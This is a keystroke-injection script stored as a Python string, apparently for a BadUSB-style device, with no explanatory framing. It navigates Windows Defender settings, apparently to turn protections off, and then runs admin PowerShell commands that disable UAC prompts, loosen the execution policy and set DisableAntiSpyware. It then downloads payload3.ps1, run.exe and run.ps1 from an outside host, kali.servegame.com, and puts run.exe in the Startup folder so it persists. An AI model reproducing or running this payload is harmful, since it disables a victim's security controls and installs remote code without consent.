data = """\WINKEY
\SLEEP 0.3
defender
\SLEEP 0.3
\ENTER
\SLEEP 1.5
 
\SLEEP 0.3
\TAB
\TAB
\TAB
\TAB
\ENTER
\SLEEP 0.2
 
\SLEEP 0.3
\ALT
Y
\SLEEP 0.3
\TAB
 
\SLEEP 0.3
\TAB
 
\SLEEP 0.3
\TAB
\TAB
 
\SLEEP 0.3
\RUNBOX
powershell.exe
\ADMINPRESS
\SLEEP 0.5
\ALT
Y
\SLEEP 0.5
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -name 'EnableLUA' -value 0;Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -name 'ConsentPromptBehaviorAdmin' -value 0;Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -name 'PromptOnSecureDesktop' -value 0;Set-ItemProperty -path 'HKLM:\SOFTWARE\Microsoft\PowerShell\\1\ShellIds\Microsoft.PowerShell' -name 'ExecutionPolicy' -value 'RemoteSigned' ;Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -name 'DisableAntiSpyware' -value 1
\ENTER
\SLEEP 0.5
\RUNBOX
powershell.exe 
\ADMINPRESS
\SLEEP 0.5
Invoke-WebRequest -Uri 'http://kali.servegame.com:8000/payload3.ps1' -OutFile 'C:/Windows/System32/payload3.ps1' ;Invoke-WebRequest -Uri 'http://kali.servegame.com:8000/run.exe' -OutFile 'C:/Users/Home/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/run.exe' ;Invoke-WebRequest -Uri 'http://kali.servegame.com:8000/run.ps1' -OutFile 'C:/Windows/System32/run.ps1'
\ENTER
\SLEEP 0.5
\DESKTOP
\SLEEP 0.5
\DELETE
\DELETE
\DELETE
\SLEEP 0.5
\WINKEY
\WINKEY"""


 